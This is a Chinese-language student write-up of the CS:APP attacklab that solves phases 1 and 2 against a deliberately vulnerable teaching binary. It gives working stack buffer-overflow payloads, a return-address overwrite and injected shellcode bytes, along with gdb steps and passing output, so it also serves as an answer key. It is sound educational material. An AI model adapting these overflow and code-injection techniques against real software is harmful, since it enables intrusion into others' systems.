# attacklab

- [attacklab](#attacklab)
  - [准备](#准备)
    - [文件下载](#文件下载)
    - [文件组成](#文件组成)
    - [提交](#提交)
    - [说明](#说明)
  - [正式开始](#正式开始)
    - [pahse\_1](#pahse_1)
    - [phase\_2](#phase_2)


## 准备

### 文件下载

所有文件均可以从官网上直接下载：[Lab Assignments](http://csapp.cs.cmu.edu/3e/labs.html)

与前两个使用不同的是，本实验需要严格按照 [PDF](http://csapp.cs.cmu.edu/3e/attacklab.pdf) 内的说明完成

### 文件组成

主要文件有三个：

* `ctarget`：为 `code-injection` 攻击，用于 `phase 1` 到 `phase 3`

* `rtarget`：为 `return-oriented programming` 攻击，用于 `phase 4` 到 `phase 5`

* `hex2raw`：用于生成攻击字符串

一个 `cookie.txt` 文件用于充当验证码的角色，后面会用到

### 提交

`ctarget` 与 `rtarget` 的用法一致：

```
Usage: [-hq] ./ctarget -i <infile> 
  -h          Print help information
  -q          Don't submit result to server
  -i <infile> Input file

Usage: [-hq] ./rtarget -i <infile> 
  -h          Print help information
  -q          Don't submit result to server
  -i <infile> Input file
```

我们不提交到服务器，因此需要带 `-q` 参数运行

`hex2raw` 的用法为：

```
usage: ./hex2raw [-h] [i IN] [-o OUT]
 -h Print this help message
 -i IN specify input text file
 -o OUT specify output data file
```

当然，可以直接 `./hex2raw < input_file > output_file`，而前两个不能这样子（需要带 `-q` 参数运行）

### 说明

`ctarget` 和 `rtarget` 的输入均是从标准输入读取，二者均是通过函数 `getbuf` 实现：

```
unsigned getbuf()
{
  char buf[BUFFER_SIZE];
  Gets(buf);
  return 1;
}
```

这里的 `Gets` 函数与标准库的 `gets` 函数行为一致，均是从标准库读取而**不做任何的边界检查**

---

## 正式开始

### pahse_1

参照 [PDF](http://csapp.cs.cmu.edu/3e/attacklab.pdf) 中 `4.1` 的部分

在 `test` 函数中会调用 `getbuf`，我们的任务是在 `getbuf` 执行完之后不再返回 `test` 函数而是返回到 `touch1` 函数

我们考察 `getbuf` 函数行为：

```assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	ret    
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

函数开始时会分配 `0x28` 也就是 `40` 字节的堆栈，随后调用 `Gets` 函数

> 需要说明的是，我们的内存地址为 `64` 位，并且在内存当中以小端存储

在调用 `getbuf` 函数之前，`call` 指令便会将 `getbuf` 的下一条指令的地址压入其过程的栈帧中，之后的部分才是 `getbuf` 过程的栈帧

因此我们可以用零来将那 `40` 个字节全部填充，然后在原先是 `call` 函数返回地址的地方写入 `touch1` 的地址

`touch1` 的地址为：`0x4017c0`，前面补零并用小端表示为：`0xc0 17 40 00`

因此最终答案为：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

运行结果：

```bash
$ ./hex2raw < answer/phase_1/input > answer/phase_1/output
$ ./ctarget -qi answer/phase_1/output 
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00 
```

### phase_2

参照 [PDF](http://csapp.cs.cmu.edu/3e/attacklab.pdf) 中 `4.2` 的部分

与上一步类似，我们在调用 `getbuf` 函数之后不能返回到 `test` 而是要到 `touch2`

需要注意的是，`touch2` 函数是带有参数的，我们需要让参数 `val` 的值与 `cookie` 的值相同即可，这便是本题需要解决的问题

> 我们首先需要知道一点：程序计数器 `PC` 所指向的内存地址就是下一条指令的字节级编码，因此如果我们希望程序去执行我们期望的代码，我们**除了需要将代码的字节级编码插入到内存中以外，还需要将 `PC` 的值设置对应的地址**

我们重新把目光放到 `getbuf` 函数上：

```assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	ret    
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

我们发现这个函数只是简单的分配 `40` 字节大小的栈帧，随后**调用 `Gets` 函数对该 `40` 字节的区域进行写入**，仅仅只是写入，并不会当成指令执行

当 `getbuf` 结束时，`ret` 指令会弹出一个跳转地址，然后 `PC` 便会跳转到该地址开始执行指令（也就是在 `test` 中 `getbuf` 函数的下一条指令的地址）

也就是说，`ret` 指令相当于执行：`PC = *rsp, rsp++`

那么如果我们需要跳转到某个地址开始执行指令的话，只能用 `ret` 的方式（因为该指令会设置 `PC` 的值）。具体地，先将待跳转地址压入栈中，随后执行 `ret` 指令即可

到此为止，我们便可以正式开始代码插入了，我们的需求是：

* 将 `%rdi` 的值改为 `cookie`
* 跳转到 `touch2` 执行代码（先将地址压入栈中，随后使用 `ret` 指令）

由于我们不知道这三条指令的字节级编码，因此我们先用汇编语言写出来，随后用 `gcc` 带 `-c` 参数进行汇编（`-c` 表示值编译和汇编而不进行链接），得到可执行程序后用 `objdump` 进行反汇编即可得到指令对应的字节级编码

在 `insert.s` 文件中，汇编代码如下：

```assembly
mov $0x59b997fa, %rdi
push $0x4017ec
ret

```

执行如下语句：

```bash
gcc -c insert.s -o insert
objdump -d insert > insert.asm
```

`insert.asm` 的内容如下：

```assembly
0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	push   $0x4017ec
   c:	c3                   	ret    
```

因此我们插入的字节级数据便得到了。但如果直接将以下内容写入，我们是得不到想要的结果的

```
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
```

正如我们刚才分析的那样，`Gets` 函数**仅仅是对栈空进进行写入**，程序计数器 `PC` 的值并没有执行栈顶，因此也就不会执行对应的代码

`getbuf` 函数结束后会执行一次 `ret`，我们在 `phase_1` 阶段将这个值覆盖为 `touch1` 的地址，我们在这里将其覆盖为栈顶地址，这样 `PC` 就可以执行栈顶了

也就是说，我们需要找到在 `getbuf` 中，`%rsp` 下降 `40` 字节后的地址

我们启动 `cgdb` 开始调试：

```bash
cgdb ./ctarget

# 在 getbuf 处打断点
(gdb) b getbuf 
Breakpoint 1 at 0x4017a8: file buf.c, line 12.

Breakpoint 1, getbuf () at buf.c:12
12      in buf.c
(gdb) n
14      in buf.c
(gdb) i r rsp
rsp            0x5561dc78          0x5561dc78
```

我们看到分配完 `40` 字节后的 `%rsp` 的地址为 `0x5561dc78` ，将地址按小端排列后覆盖原先的 `getbuf` 的返回地址，有：

```
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

运行结果：

```bash
$ ./ctarget -qi ./answer/phase_2/output 
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
```